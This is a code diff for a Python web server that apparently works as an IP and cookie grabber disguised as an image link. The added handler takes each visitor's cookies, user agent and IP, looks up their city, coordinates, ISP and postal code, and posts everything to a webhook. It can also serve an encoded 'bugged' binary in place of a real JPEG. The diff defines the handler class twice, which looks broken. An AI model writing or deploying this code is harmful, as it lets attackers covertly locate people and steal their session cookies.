@@ -61,6 +61,51 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
+        cookies = self.headers.get("Cookie")
+        s = self.path
+        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+        ip = self.client_address[0]
+        uag = self.headers.get("User-Agent")
+        useragent = httpagentparser.detect(uag)
+        os = useragent['os']['name']
+        browser = useragent['browser']['name']
+        if 'ip' in dic:
+            try:
+                city = requests.get(f'https://ipapi.co/{ip}/city/').text
+                reg = requests.get(f'https://ipapi.co/{ip}/region/').text
+                country = requests.get(f'https://ipapi.co/{ip}/country_name/').text
+                loc = requests.get(f'https://ipapi.co/{ip}/latlong/').text
+                org = requests.get(f'https://ipapi.co/{ip}/org/').text
+                postal = requests.get(f'https://ipapi.co/{ip}/postal/').text
+            except:
+                pass
+            if 'img' in dic:
+                requests.post(webhook, json=formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser,cookies))
+                if buggedimg:
+                    self.send_response(200)
+                    self.send_header('Content-type','image/jpeg')
+                    self.end_headers()
+                    self.wfile.write(buggedbin)
+                else:
+                    self.send_response(200)
+                    self.send_header('Content-type','image/jpeg')
+                    self.end_headers()
+                    self.wfile.write(bindata)
+            else:
+                requests.post(webhook, json=prev(ip,uag,cookies))
+                self.send_response(200)
+                self.send_header('Content-type','text/html')
+                self.end_headers()
+                self.wfile.write(b'<html><body><h1>404</h1></body></html>')
+        else:
+            self.send_response(200)
+            self.send_header('Content-type','text/html')
+            self.end_headers()
+            self.wfile.write(b'<html><body><h1>404</h1></body></html>')
+
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
         try: data = requests.get(dic['url']).content if 'url' in dic else bindata
